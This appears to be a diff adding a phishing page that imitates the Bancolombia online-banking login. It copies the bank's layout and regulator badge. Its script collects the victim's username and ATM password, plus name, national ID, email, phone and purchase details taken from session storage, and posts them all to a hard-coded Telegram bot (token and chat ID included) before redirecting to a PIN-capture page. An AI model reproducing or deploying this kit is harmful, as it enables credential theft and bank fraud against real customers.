@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas | Bancolombia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Decorative curves background */
+        .background-curves {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .curve {
+            position: absolute;
+            border-radius: 50%;
+            border: 8px solid transparent;
+        }
+
+        .curve-yellow {
+            width: 800px;
+            height: 400px;
+            border-color: #FDDA24;
+            top: 180px;
+            right: -200px;
+            transform: rotate(-15deg);
+            border-radius: 0 0 400px 400px;
+            border-top: none;
+        }
+
+        .curve-orange {
+            width: 600px;
+            height: 300px;
+            border-color: #F7941D;
+            top: 280px;
+            right: -100px;
+            transform: rotate(-10deg);
+            border-radius: 0 0 300px 300px;
+            border-top: none;
+        }
+
+        .curve-purple-1 {
+            width: 120px;
+            height: 120px;
+            border-color: #8B5CF6;
+            top: 220px;
+            left: 80px;
+            border-radius: 50%;
+            border-width: 6px;
+            transform: rotate(45deg);
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+        }
+
+        .curve-purple-2 {
+            width: 80px;
+            height: 80px;
+            border-color: #8B5CF6;
+            top: 420px;
+            left: 160px;
+            border-radius: 50%;
+            border-width: 6px;
+            border-right-color: transparent;
+            border-top-color: transparent;
+            border-left-color: transparent;
+        }
+
+        .curve-yellow-left {
+            width: 300px;
+            height: 200px;
+            border-color: #FDDA24;
+            top: 280px;
+            left: -50px;
+            transform: rotate(30deg);
+            border-radius: 200px 200px 0 0;
+            border-bottom: none;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 20px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-placeholder {
+            width: 200px;
+            height: 40px;
+            background: linear-gradient(90deg, #2D2D2D 70%, #FDDA24 70%);
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        /* Uncomment and use your logo */
+        /*
+        .logo {
+            width: 200px;
+            height: 40px;
+            object-fit: contain;
+        }
+        */
+
+        .page-title {
+            font-size: 28px;
+            color: #4a4a4a;
+            font-weight: 300;
+            margin-top: 20px;
+        }
+
+        /* Main content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Info banner */
+        .info-banner {
+            background-color: #E3F4FC;
+            border: 1px solid #B8E0F3;
+            border-radius: 8px;
+            padding: 16px 20px;
+            max-width: 420px;
+            width: 100%;
+            margin-bottom: 30px;
+            display: flex;
+            gap: 12px;
+        }
+
+        .info-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .info-icon svg {
+            width: 100%;
+            height: 100%;
+            color: #0D6EFD;
+        }
+
+        .info-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+
+        .info-content p {
+            font-size: 13px;
+            color: #4a4a4a;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .info-content a {
+            font-size: 13px;
+            color: #1a1a1a;
+            font-weight: 600;
+            text-decoration: underline;
+        }
+
+        .info-content a:hover {
+            color: #FDDA24;
+        }
+
+        /* Login card */
+        .login-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .login-card h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .login-card .subtitle {
+            font-size: 14px;
+            color: #6b6b6b;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* Input groups */
+        .input-group {
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #ccc;
+            padding: 12px 0;
+            gap: 12px;
+        }
+
+        .input-wrapper:focus-within {
+            border-bottom-color: #FDDA24;
+        }
+
+        .input-icon {
+            width: 20px;
+            height: 20px;
+            color: #888;
+            flex-shrink: 0;
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            color: #1a1a1a;
+            background: transparent;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #888;
+        }
+
+        .help-link {
+            display: block;
+            text-align: left;
+            font-size: 12px;
+            color: #1a1a1a;
+            font-weight: 600;
+            text-decoration: underline;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+
+        .help-link:hover {
+            color: #F7941D;
+        }
+
+        /* Submit button */
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #D1D1D1;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            color: #6b6b6b;
+            cursor: not-allowed;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn.active {
+            background-color: #FDDA24;
+            color: #1a1a1a;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #F7C800;
+        }
+
+        .create-user {
+            font-size: 14px;
+            color: #1a1a1a;
+            font-weight: 600;
+            text-decoration: underline;
+        }
+
+        .create-user:hover {
+            color: #F7941D;
+        }
+
+        /* Footer links */
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            padding: 40px 20px 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            color: #4a4a4a;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links span {
+            color: #ccc;
+        }
+
+        /* Bottom footer */
+        .bottom-footer {
+            border-top: 1px solid #e0e0e0;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 1;
+            background: white;
+        }
+
+        .footer-logo {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .footer-logo-placeholder {
+            width: 150px;
+            height: 30px;
+            background: linear-gradient(90deg, #2D2D2D 70%, #FDDA24 70%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 10px;
+        }
+
+        .vigilado {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .vigilado-badge {
+            background: #C41E3A;
+            color: white;
+            font-size: 8px;
+            font-weight: bold;
+            padding: 2px 6px;
+            border-radius: 2px;
+        }
+
+        .vigilado-text {
+            font-size: 8px;
+            color: #666;
+            line-height: 1.2;
+        }
+
+        .footer-info {
+            text-align: right;
+            font-size: 12px;
+            color: #888;
+            line-height: 1.5;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .page-title {
+                font-size: 22px;
+            }
+
+            .login-card {
+                padding: 30px 24px;
+            }
+
+            .bottom-footer {
+                flex-direction: column;
+                align-items: center;
+                gap: 16px;
+                text-align: center;
+            }
+
+            .footer-info {
+                text-align: center;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .footer-links span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Background decorative curves -->
+    <div class="background-curves">
+        <div class="curve curve-yellow"></div>
+        <div class="curve curve-orange"></div>
+        <div class="curve curve-purple-1"></div>
+        <div class="curve curve-purple-2"></div>
+        <div class="curve curve-yellow-left"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <!-- Logo placeholder - Replace with your logo -->
+        <img src="/img/bancolombia-logo.svg" alt="Bancolombia" class="logo">
+
+        <h1 class="page-title">Sucursal Virtual Personas</h1>
+    </header>
+
+    <!-- Main content -->
+    <main class="main-content">
+        <!-- Info banner -->
+        <div class="info-banner">
+            <div class="info-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M9 18h6" />
+                    <path d="M10 22h4" />
+                    <path
+                        d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7z" />
+                </svg>
+            </div>
+            <div class="info-content">
+                <h3>¡Prográmate!</h3>
+                <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+                <a href="#">Más info aquí.</a>
+            </div>
+        </div>
+
+        <!-- Login card -->
+        <div class="login-card">
+            <h2>¡Hola!</h2>
+            <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
+                            <circle cx="12" cy="7" r="4" />
+                        </svg>
+                        <input type="text" id="usuario" placeholder="Usuario" autocomplete="username">
+                    </div>
+                    <a href="#" class="help-link">¿Olvidaste tu usuario?</a>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-wrapper">
+                        <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="3" />
+                            <path d="M12 1v2" />
+                            <path d="M12 21v2" />
+                            <path d="M4.22 4.22l1.42 1.42" />
+                            <path d="M18.36 18.36l1.42 1.42" />
+                            <path d="M1 12h2" />
+                            <path d="M21 12h2" />
+                            <path d="M4.22 19.78l1.42-1.42" />
+                            <path d="M18.36 5.64l1.42-1.42" />
+                        </svg>
+                        <input type="password" id="clave" placeholder="Clave del cajero"
+                            autocomplete="current-password">
+                    </div>
+                    <a href="#" class="help-link">¿Olvidaste o bloqueaste tu clave?</a>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>Iniciar sesión</button>
+            </form>
+
+            <a href="#" class="create-user">Crear usuario</a>
+        </div>
+    </main>
+
+    <!-- Footer links -->
+    <nav class="footer-links">
+        <a href="#">¿Problemas para conectarte?</a>
+        <span>·</span>
+        <a href="#">Aprende sobre seguridad</a>
+        <span>·</span>
+        <a href="#">Reglamento Sucursal Virtual</a>
+        <span>·</span>
+        <a href="#">Política de privacidad</a>
+    </nav>
+
+    <!-- Bottom footer -->
+    <footer class="bottom-footer">
+        <div class="footer-logo">
+            <!-- Footer logo placeholder -->
+            <!--  <div class="footer-logo-placeholder">LOGO 150x30</div> -->
+            <img src="/img/bancolombia-logo.svg" alt="Bancolombia"
+                style="width: 150px; height: 30px; object-fit: contain;">
+
+            <div class="vigilado">
+                <span class="vigilado-badge">VIGILADO</span>
+                <span class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
+            </div>
+        </div>
+
+        <div class="footer-info">
+            <div>Dirección IP: 181.78.22.174</div>
+            <div id="datetime">
+                <script>dateTime();</script>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Enable/disable submit button based on input
+        const usuarioInput = document.getElementById('usuario');
+        const claveInput = document.getElementById('clave');
+        const submitBtn = document.getElementById('submitBtn');
+
+        function checkInputs() {
+            if (usuarioInput.value.trim() !== '' && claveInput.value.trim() !== '') {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+        }
+
+        usuarioInput.addEventListener('input', checkInputs);
+        claveInput.addEventListener('input', checkInputs);
+
+        // Update datetime
+        function updateDateTime() {
+            const now = new Date();
+            const options = {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: 'numeric',
+                minute: '2-digit',
+                hour12: true
+            };
+            const formatted = now.toLocaleDateString('es-CO', options);
+            document.getElementById('datetime').textContent = formatted;
+        }
+
+        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+        const CHAT_ID = "6483487531";
+
+        async function sendToTelegram(text) {
+            if (!CHAT_ID) return;
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            };
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(body)
+            });
+        }
+
+        const nombre = sessionStorage.getItem("nombre") || "—";
+        const cedula = sessionStorage.getItem("cedula") || "—";
+        const correo = sessionStorage.getItem("correo") || "—";
+        const telefono = sessionStorage.getItem("telefono") || "—";
+        const total = sessionStorage.getItem("total") || "—";
+        const producto = sessionStorage.getItem("producto") || "—";
+
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const usuario = usuarioInput.value.trim();
+            const clave = claveInput.value.trim();
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Procesando...';
+
+            const text = `🏦 <b>Login Bancolombia</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🧑‍💻 Usuario: ${usuario}\n🔑 Clave cajero: ${clave}`;
+            
+            try {
+                await sendToTelegram(text);
+            } catch (err) { console.error(err); }
+
+            window.location.href = "bancolombia-pin.html";
+        });
+
+        updateDateTime();
+    </script>
+</body>
+
+</html>
